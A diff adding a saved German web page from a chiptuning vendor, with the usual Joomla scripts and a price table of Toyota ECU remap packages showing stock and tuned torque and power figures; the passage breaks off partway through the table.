@@ -1,0 +1,1027 @@
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="_LANGUAGE" xml:lang="_LANGUAGE">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+  <base href="http://www.competition-parts.de/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta http-equiv="language" content="de" />
+  <meta http-equiv="imagetoolbar" content="false" />
+  <meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
+  <meta http-equiv="content-language" content="de,de-at,de-ch,en-EN" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="Chiptuning Toyota, Auris, Avensis, Aygo, Corolla, Hiace, Hilux, Land Cruiser, Previa, RAV4, Supra, Turbo, Yaris, Leistungssteigerung" />
+  <meta name="lang" content="de-DE" />
+  <meta name="google" content="index, follow" />
+  <meta name="page-type" content="Business" />
+  <meta name="author" content="competition-parts.de" />
+  <meta name="copyright" content="competition-parts.de" />
+  <meta name="publisher" content="competition-parts.de" />
+  <meta name="country" content="DE" />
+  <meta name="distribution-content" content="global" />
+  <meta name="pragma" content="no-cache" />
+  <meta name="googlebot" content="index, follow" />
+  <meta name="google-site-verification" content="googleae448056e216a089.html" />
+  <meta name="expires" content="never" />
+  <meta name="revisit-after" content="10 days" />
+  <meta name="contact_addr" content="competition-parts.de" />
+  <meta name="description" content="Mehr Leistung - weniger Verbrauch für Ihren Toyota Auris, Avensis, Aygo, Corolla, Hiace, Hilux, Land Cruiser, Previa, RAV4, Supra, Turbo, Yaris" />
+  <title>Chiptuning Toyota Auris, Avensis, Aygo, Corolla, Hiace, Hilux, Land Cruiser, Previa, RAV4, Supra, Turbo, Yaris - Tuningfiles, Chiptuning Files, Fileservice und Softwareentwicklung und ECU remapping für Chiptuner - Chiptuningfiles.</title>
+  <link href="/templates/pj_velocity_15/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link href="/ninjarsssyndicator.html" rel="alternate" type="application/rss+xml" title="RSS Feeds - Chiptuning - Tuningfiles - Chiptuningfiles - Chip Tuning - Tuning Files Newsfeeds" />
+  <link rel="stylesheet" href="/media/system/css/modal.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.competition-parts.de/components/com_k2/css/k2.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.competition-parts.de/modules/mod_pj_newslist/mod_pj_newslist.css.php" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_customenu/customenu/css/default.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/modal.js"></script>
+  <script type="text/javascript" src="http://www.competition-parts.de/components/com_k2/js/k2.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+  <script type="text/javascript" src="/modules/mod_customenu/customenu/js/customenu.js"></script>
+  <script type="text/javascript">
+
+		window.addEvent('domready', function() {
+
+			SqueezeBox.initialize({});
+
+			$$('a.modal').each(function(el) {
+				el.addEvent('click', function(e) {
+					new Event(e).stop();
+					SqueezeBox.fromElement(el);
+				});
+			});
+		});var K2RatingURL = 'http://www.competition-parts.de/';
+  </script>
+  <!-- SWFObject embed by Geoff Stearns geoff@deconcept.com http://blog.deconcept.com/swfobject/ -->
+  <script type="text/javascript" src="/modules/mod_joomulus/swfobject.js"></script>
+
+
+
+
+<link href="/templates/pj_velocity_15/css/1.css" title="1" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/2.css" title="2" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/3.css" title="3" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/4.css" title="4" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/5.css" title="5" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/6.css" title="6" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/7.css" title="7" rel="alternate stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/8.css" title="8" rel="alternate stylesheet" type="text/css" />
+
+<link href="/templates/pj_velocity_15/css/template_css.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/toolset.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/anythingslider.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/superfish.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/superfish-navbar.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/superfish-vertical.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/superfish-accordion.css" rel="stylesheet" type="text/css" />
+<link href="/templates/pj_velocity_15/css/module_styling.css" rel="stylesheet" type="text/css" />
+
+
+<!-- REQUIRED CSS -->
+<style type="text/css" media="screen">
+#contentcolumn {margin:0px 240px 0 240px;}
+#leftcolumn{width:240px;margin-left:-100%;} 
+#outercolumn-l{width:240px;margin-left:-0%;} 
+#outercolumn-r{width:240px;margin-left:-240px;} 
+.innerbarrel {margin:0px 240px 0px 240px;}
+#rightcolumn{width:240px;margin-left:-240px;} 
+.pjlimiter {width:992px;}
+#leftcolumn .sf-vertical li {
+	width:	215px;
+}
+#outerpad-l .sf-vertical li {
+	width:	215px;
+}
+#panel {width:0px }
+.anythingSlider                       				  {width: 450px; height: 200px;}
+.anythingSlider .wrapperas, .anythingSlider ul li     {height:179px; width:425px;}
+.anythingSlider .wrapperas {background:transparent;}
+.anythingSlider .arrow	{top: 50px;}
+.anythingSlider #thumbNav, .anythingSlider #start-stop	{top: 180px;}
+
+
+</style>
+
+
+<!-- 5 COLUMN LAYOUT CONDITIONS -->
+<style type="text/css" media="screen"> .innerbarrel{margin-left: 0px;}</style><style type="text/css" media="screen"> .innerbarrel{margin-right: 0px;}
+</style><style type="text/css" media="screen">#contentcolumn{margin-left: 0px;padding-left:0px;}
+#mainbody-pad {padding-left:20px;}
+</style><style type="text/css" media="screen">#contentcolumn{margin-right: 0px;padding-right:0px;}
+#mainbody-pad {padding-right:20px;}
+</style>
+		
+
+
+
+<!--[if lte IE 6]><script src="/templates/pj_velocity_15/scripts/ie6/warning.js"></script><script>window.onload=function(){e("templates/pj_velocity_15/scripts/ie6/")}</script><![endif]-->
+    
+
+<!-- JS -->
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/jquery.js"></script>
+<script type="text/javascript">
+      jQuery.noConflict();
+</script>
+
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/jquery.float.js"></script>
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/mod_pjmenu_ext/easing.js"></script>
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/mod_pjmenu_ext/hoverIntent.js"></script>
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/mod_pjmenu_ext/superfish2.js"></script>
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/mod_pjmenu_ext/pj_jq_init.js"></script>
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/pj_columns.js"></script>
+
+
+<script type="text/javascript" src="/templates/pj_velocity_15/scripts/jquery.anythingslider.js"></script>
+
+
+<script type="text/javascript">  
+
+jQuery(document).ready(function(){
+								
+var defSiz = readCookie("font_size") ? readCookie("font_size") : "mediumfonts";
+var defCol = readCookie("style_color") ? readCookie("style_color") : "5";
+function switchFont(newFont)
+{
+    jQuery("body").removeClass().addClass(newFont);
+    createCookie('font_size', newFont, 365);
+    return false;
+}
+
+function switchStylestyle(styleName, cmode, availStyles)
+{
+    jQuery('link[@rel*=style][@title]').each(function(i)
+    {
+        if (in_array(this.getAttribute('title'), availStyles))
+        {
+            this.disabled = true;
+
+            if (this.getAttribute('title') == styleName)
+            {
+                this.disabled = false;
+            }
+        }
+    });
+
+    createCookie('style_' + cmode, styleName, 365);
+}
+
+function createCookie(name, value, days)
+{
+    if (days)
+    {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        var expires = "; expires=" + date.toGMTString();
+    }
+    else
+    {
+        var expires = "";
+    }
+
+    document.cookie = name + "=" + value + expires + "; path=/";
+}
+
+function readCookie(name)
+{
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+
+    for (var i = 0; i < ca.length; i++)
+    {
+        var c = ca[i];
+
+        while (c.charAt(0) == ' ')
+            c = c.substring(1, c.length);
+
+        if (c.indexOf(nameEQ) == 0)
+            return c.substring(nameEQ.length, c.length);
+    }
+
+    return null;
+}
+
+function eraseCookie(name)
+{
+    createCookie(name, "", -1);
+}
+
+// Arrays for Style Switching
+function in_array(needle, haystack)
+{
+    for (h in haystack)
+    {
+        if (haystack[h] == needle)
+        {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+var style_id_list_c = new Array("1", "2", "3", "4", "5", "6", "7", "8");
+
+jQuery.preloadImages = function()
+{
+    for (var i = 0; i < arguments.length; i++)
+    {
+        img = new Image();
+        img.src = arguments[i];
+    }
+};
+
+jQuery('.sizeswitch').each(function(i)
+{
+    style_id_list_s[i] = jQuery(this).rel();
+});
+
+switchStylestyle(defCol, "color", style_id_list_c);
+switchFont(defSiz);
+
+jQuery(document).ready(function()
+{
+    jQuery('.styleswitch').click(function()
+    {
+        switchStylestyle(this.getAttribute("rel"), "color", style_id_list_c);
+        jQuery('.styleswitch').removeClass("active-option");
+        jQuery(this).addClass("active-option");
+        return false;
+    });
+
+    jQuery('.fontswitch').click(function()
+    {
+        switchFont(this.getAttribute("rel"));
+        jQuery('.fontswitch').removeClass("active-option");
+        jQuery(this).addClass("active-option");
+        return false;
+    });
+	
+    jQuery(".styleswitch[@rel*=" + defCol + "]").addClass("active-option");
+    jQuery(".fontswitch[@rel*=" + defSiz + "]").addClass("active-option");
+
+});
+
+jQuery(document).ready(function() {
+	jQuery("div.panel_button").click(function(){
+		jQuery("div#panel").animate({
+			height: "30px"
+		})
+		.animate({
+			height: "0pxpx"
+		}, "fast");
+		jQuery("div.panel_button").toggle();
+	});	
+jQuery("div#hide_button").click(function(){
+		jQuery("div#panel").animate({
+			height: "0px"
+		}, "fast");
+   });	
+	
+});
+
+
+		jQuery('#pjsearch-button').toggle(
+			function () {jQuery('#pjsearchbox').animate({opacity:'toggle', marginTop:'-2px'},500);},
+			function () {jQuery('#pjsearchbox').animate({opacity:'toggle', marginTop:'-15px'}, 500);}
+		);
+	     
+	jQuery('#pjlogin-button').toggle(
+			function () {jQuery('#pjloginbox').animate({opacity:'toggle', marginTop:'14px'},500);},
+			function () {jQuery('#pjloginbox').animate({opacity:'toggle', marginTop:'-2px'}, 500);}
+		);
+	
+								
+   function formatText(index, panel) {
+		  return index + "";
+	    }
+    //ANYTHING SLIDER FUNCTIONALITY
+        jQuery(function () {
+            jQuery('.anythingSlider, .anythingSlider_thin').anythingSlider({
+                easing: "easeInOutExpo",        // Anything other than "linear" or "swing" requires the easing plugin
+				autoPlay: true,                 // This turns off the entire FUNCTIONALY, not just if it starts running or not.
+                delay: 7000,                    // How long between slide transitions in AutoPlay mode
+                startStopped: false,            // If autoPlay is on, this can force it to start stopped
+                animationTime: 600,             // How long the slide transition takes
+                hashTags: true,                 // Should links change the hashtag in the URL?
+                buildNavigation: true,          // If true, builds and list of anchor links to link to each slide
+        		pauseOnHover: true,             // If true, and autoPlay is enabled, the show will pause on hover
+        		startText: "<img src='templates/pj_velocity_15/images/slider-play.png' alt='start'/>", // Start text
+		        stopText: "<img src='templates/pj_velocity_15/images/slider-pause.png' alt='stop' />", // Stop text
+		        navigationFormatter: formatText       // Details at the top of the file on this use (advanced use)
+            });
+        }); 
+		
+		     
+		jQuery(function(){
+		jQuery('.puremodule').addClass("dontsplit");  
+		jQuery('#topusers2').columnize({columns: 0});
+		jQuery('#bottomusers').columnize({columns: 0});
+		jQuery('#footerusers').columnize({columns: 0});
+});
+		     
+
+});
+</script>
+
+<!--[if lte IE 7]>
+<style type="text/css" media="screen">
+     
+#topmodule-inner .wrapperas ul li td, #headerwrapper .wrapperas ul li td {padding:4px 0 0 0px;}
+.panel_button {
+	top:-5px;
+}
+</style>
+<![endif]-->
+</head>
+<body class="">
+<div id="pageoverall">
+                                <div id="social_icons" class="floatMenu">
+<a href="http://www.facebook.com/home.php?sfrm=1#!/profile.php?id=1835621759" ><img src="/templates/pj_velocity_15/images/facebook.png" class="Tips2" title="We're on Facebook :: See what we're up to..." /></a>        
+                        
+<a href="http://twitter.com/#!/Tuningfiles_OLS" ><img src="/templates/pj_velocity_15/images/twitter.png" class="Tips2" title="Follow Us :: Follow us on Twitter" /></a>      
+ <a href="http://de.linkedin.com/pub/tradenia-tuningfiles/30/a6/452" ><img src="/templates/pj_velocity_15/images/linkedin.png" class="Tips2" title="See Our Profile :: We're on LinkedIn." /></a>                        
+<a href="http://www.competition-parts.de/index.php?option=com_ninjarsssyndicator&feed_id=1&format=raw" ><img src="/templates/pj_velocity_15/images/rss.png" class="Tips2" title="RSS Feeds :: Get fed up on our feeds." /></a>                           
+                 
+                                </div>   
+<!--banner-->
+<div id="banner_frame" style="z-index:1;">
+<div id="banner" class="pjlimiter">
+<div id="banner-inner">
+ 		<div class="moduletable">
+					<div id="jflanguageselection"><div class="rawimages"><span id="active_language"><a href="http://www.competition-parts.de/de/toyota/toyota-2.html"><img src="/components/com_joomfish/images/flags/de.gif" alt="Deutsch (DE-CH-AT)" title="Deutsch (DE-CH-AT)" /></a></span><span><a href="http://www.competition-parts.de/en/toyota/toyota.html"><img src="/components/com_joomfish/images/flags/en.gif" alt="English (United Kingdom)" title="English (United Kingdom)" /></a></span></div></div><!--Joom!fish V2.0.3 (Flash)-->
+<!-- &copy; 2003-2009 Think Network, released under the GPL. -->
+<!-- More information: at http://www.joomfish.net -->
+		</div>
+			<div class="moduletable">
+					<div class="bannergroup">
+
+<div class="banneritem"><img src="http://www.competition-parts.de/images/banners/logo-tradenia.png" alt="Banner" /><div class="clr"></div>
+	</div>
+
+</div>		</div>
+	 
+</div>                                                   
+</div>
+</div> 
+<!--end banner-->
+<div id="breadcrumb" class="cf">
+<div id="breadcrumb-inner" class="pjlimiter">
+</div>
+</div>
+<div id="menuwrapper">
+<div id="menuwrapper-inner" class="pjlimiter"> 
+<!--logo-->
+
+<div id="logo_frame" style="z-index:1;">
+<div id="logo">
+</div>                                                   
+</div> 
+
+
+
+    
+<!--search-->
+
+<div id="pjsearch_frame">
+<div id="pjsearch_inner">
+<div id="pjsearch-area">
+<a href="#" id="pjsearch-button">Search<!--<img src="/templates/pj_velocity_15/images/search-button.png" height="35" width="35" alt="Search Btn"/>--></a>
+<div id="pjsearchbox">
+<form action="http://www.competition-parts.de/" method="post" >
+<input name="searchword" maxlength="20" alt="Search" class="inputbox" size="21" value="search the site..." onblur="if(this.value=='') this.value='search the site...';" onfocus="if(this.value=='search the site...') this.value='';" type="text" />	
+<input name="task" value="search" type="hidden" />
+<input name="option" value="com_search" type="hidden" />
+<input name="Itemid" value="300" type="hidden" />
+</form>					
+</div>
+</div>
+</div>                                                   
+</div>
+
+<!--end search-->
+                 
+
+</div>
+</div> 
+                             
+
+
+
+                              
+                                      
+								                             
+                                                                                   <div id="topmodule" class="cf"><div id="topmodule-inner"  class="pjlimiter">
+                                                            <div class="customenu_layout_default"><div class="customenu_default"><a href="/chiptuningfiles/tuningfiles_chiptuning_ecu_remapping_OBD_Tuning.html" title="Softwareentwicklung" class="link_1 link_id53 link_inactive " onfocus="this.blur();"><span class="link_1 link_id53 link_inactive  link_normal" onmouseover="changeClassName(this,'link_normal','link_hover');" onmouseout="changeClassName(this,'link_hover','link_normal');">Softwareentwicklung</span></a><a href="/de/handlerinformationen/handlerinformationen.html" title="Händlerinformationen" class="link_2 link_id55 link_inactive " onfocus="this.blur();"><span class="link_2 link_id55 link_inactive  link_normal" onmouseover="changeClassName(this,'link_normal','link_hover');" onmouseout="changeClassName(this,'link_hover','link_normal');">Händlerinformationen</span></a><a href="/de/chiptuning-pkw/" title="Chiptuning" class="link_3 link_id41 link_inactive " onfocus="this.blur();"><span class="link_3 link_id41 link_inactive  link_normal" onmouseover="changeClassName(this,'link_normal','link_hover');" onmouseout="changeClassName(this,'link_hover','link_normal');">Chiptuning</span></a><a href="/de/fragen-und-antworten-zum-thema-chiptuning.html" title="Fragen und Antworten" class="link_4 link_id56 link_inactive " onfocus="this.blur();"><span class="link_4 link_id56 link_inactive  link_normal" onmouseover="changeClassName(this,'link_normal','link_hover');" onmouseout="changeClassName(this,'link_hover','link_normal');">Fragen und Antworten</span></a><a href="/de/infos-fur-spediteure.html" title="ECO Lösungen  LKW/NFZ" class="link_5 link_id50 link_inactive " onfocus="this.blur();"><span class="link_5 link_id50 link_inactive  link_normal" onmouseover="changeClassName(this,'link_normal','link_hover');" onmouseout="changeClassName(this,'link_hover','link_normal');">ECO Lösungen  LKW/NFZ</span></a><a href="/de/kontakt.html" title="Kontakt" class="link_6 link_id61 link_inactive " onfocus="this.blur();"><span class="link_6 link_id61 link_inactive  link_normal" onmouseover="changeClassName(this,'link_normal','link_hover');" onmouseout="changeClassName(this,'link_hover','link_normal');">Kontakt</span></a></div></div>
+                                                    </div></div>
+                                 
+                                
+                                   <div id="outer-container">
+<div id="outer-container-2" class="pjlimiter" >
+             
+
+
+     
+                 
+                                                                       
+<div class="innerbarrel">
+<div id="inner-pad">
+<div id="inner-pad-border" class="cf ltlist">
+                               
+                                     	 
+<div id="contentframe">
+<div id="contentcolumn"> 
+                                
+                                        <div id="mainbody-pad">
+                                        <div id="mainbody-pad-2">
+                                        
+                                        
+<table class="contentpaneopen">
+
+
+
+<tr>
+<td valign="top">
+<div style="text-align: center"><img src="/images/stories/toyota.png" border="0" /></div><div style="text-align: center"> <table border="0" cellspacing="2" cellpadding="0" width="100%"> 	<tbody><tr bgcolor="#cccccc"> 		<td width="74%"> 		<table border="0" cellspacing="0" cellpadding="0" width="160"> 			<tbody><tr> 				<td><u>Hersteller / manufacturer: Toyota</u></td> 			</tr> 			<tr> 				<td><strong>Modell / model</strong></td> 			</tr> 		</tbody></table> 		</td> 		<td> 		<table border="0" cellspacing="0" cellpadding="0" width="110"> 			<tbody><tr> 				<td colspan="3" align="center"><strong>Serienleistung</strong></td> 			</tr> 			<tr> 				<td align="center">Nm</td> 				<td align="center">kW</td> 				<td align="center">PS</td> 			</tr> 		</tbody></table> 		</td> 		<td> 		<table border="0" cellspacing="0" cellpadding="0" width="110"> 			<tbody><tr> 				<td colspan="3" align="center"><strong>Mehrleistung</strong></td> 			</tr> 			<tr> 				<td align="center">Nm</td> 				<td align="center">kW</td> 				<td align="center">PS</td> 			</tr> 		</tbody></table> 		</td> 		<td> 		<table border="0" cellspacing="0" cellpadding="0" width="110"> 			<tbody><tr> 				<td colspan="3" align="center"><strong>COMPETITION</strong></td> 			</tr> 			<tr> 				<td align="center">Nm</td> 				<td align="center">kW</td> 				<td align="center">PS</td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"></td>--> 	</tr> 	<tr bgcolor="#ffffff"> 		<td width="74%"><strong>Chiptuning - Toyota,Auris 1,4 L 16V</strong> <br /> 		EUR 498,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">130</td> 				<td width="33%" align="center">71</td> 				<td width="33%" align="center">(97)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">15</td> 				<td width="33%" align="center">7</td> 				<td width="33%" align="center">(10)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">145</td> 				<td width="33%" align="center">78</td> 				<td width="33%" align="center"><strong>(107)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#e4e4e4"> 		<td width="74%"><strong>Chiptuning - Toyota,Auris 1,6 L 16V</strong> <br /> 		EUR 498,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">157</td> 				<td width="33%" align="center">91</td> 				<td width="33%" align="center">(124)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">13</td> 				<td width="33%" align="center">9</td> 				<td width="33%" align="center">(12)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">170</td> 				<td width="33%" align="center">100</td> 				<td width="33%" align="center"><strong>(136)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#ffffff"> 		<td width="74%"><strong>Chiptuning - Toyota,Auris 2,0 L D</strong> <br /> 		- MO<br /> 		EUR 548,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">300</td> 				<td width="33%" align="center">90</td> 				<td width="33%" align="center">(122)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">45</td> 				<td width="33%" align="center">18</td> 				<td width="33%" align="center">(24)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">345</td> 				<td width="33%" align="center">108</td> 				<td width="33%" align="center"><strong>(146)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#e4e4e4"> 		<td width="74%"><strong>Chiptuning - Toyota,Auris 2,2 L D-Kat</strong> <br /> 		- MO<br /> 		EUR 598,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">400</td> 				<td width="33%" align="center">130</td> 				<td width="33%" align="center">(177)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">50</td> 				<td width="33%" align="center">18</td> 				<td width="33%" align="center">(24)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">450</td> 				<td width="33%" align="center">148</td> 				<td width="33%" align="center"><strong>(201)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#ffffff"> 		<td width="74%"><strong>Chiptuning - Toyota,Avensis 2,0 L D</strong> <br /> 		- MO<br /> 		EUR 498,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">280</td> 				<td width="33%" align="center">85</td> 				<td width="33%" align="center">(116)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">45</td> 				<td width="33%" align="center">18</td> 				<td width="33%" align="center">(24)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">325</td> 				<td width="33%" align="center">103</td> 				<td width="33%" align="center"><strong>(140)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#e4e4e4"> 		<td width="74%"><strong>Chiptuning - Toyota,Avensis 2,0 L D</strong> <br /> 		- MO<br /> 		EUR 498,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">300</td> 				<td width="33%" align="center">93</td> 				<td width="33%" align="center">(126)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">45</td> 				<td width="33%" align="center">19</td> 				<td width="33%" align="center">(26)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">345</td> 				<td width="33%" align="center">112</td> 				<td width="33%" align="center"><strong>(152)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#ffffff"> 		<td width="74%"><strong>Chiptuning - Toyota,Avensis 2,2 L D</strong> <br /> 		- MO<br /> 		EUR 548,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">310</td> 				<td width="33%" align="center">110</td> 				<td width="33%" align="center">(150)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">48</td> 				<td width="33%" align="center">19</td> 				<td width="33%" align="center">(26)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">358</td> 				<td width="33%" align="center">129</td> 				<td width="33%" align="center"><strong>(176)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#e4e4e4"> 		<td width="74%"><strong>Chiptuning - Toyota,Avensis 2,2 L D-Kat</strong> <br /> 		- MO<br /> 		EUR 548,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">400</td> 				<td width="33%" align="center">130</td> 				<td width="33%" align="center">(177)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">45</td> 				<td width="33%" align="center">21</td> 				<td width="33%" align="center">(29)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">445</td> 				<td width="33%" align="center">151</td> 				<td width="33%" align="center"><strong>(206)</strong></td> 			</tr> 		</tbody></table> 		</td> <!--<td width="54"><nobr> Bestellen&nbsp;<img src='images/misc/pfeil_gelb.gif' border='0'>&nbsp; </nobr></td>--> 	</tr> 	<tr> 		<td colspan="4" height="1" style="border-bottom: 1px dotted #d0cfcf"> 		<img border="0" width="1" height="1" /></td> 	</tr> 	<tr bgcolor="#ffffff"> 		<td width="74%"><strong>Chiptuning - Toyota,Aygo 1,0 L </strong><br /> 		EUR 498,00 		</td> 		<td width="9%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">93</td> 				<td width="33%" align="center">50</td> 				<td width="33%" align="center">(68)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="8%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">15</td> 				<td width="33%" align="center">10</td> 				<td width="33%" align="center">(14)</td> 			</tr> 		</tbody></table> 		</td> 		<td width="7%" align="center"> 		<table border="0" cellspacing="2" cellpadding="0" width="100%"> 			<tbody><tr> 				<td width="33%" align="center">108</td> 				<td width="33%" 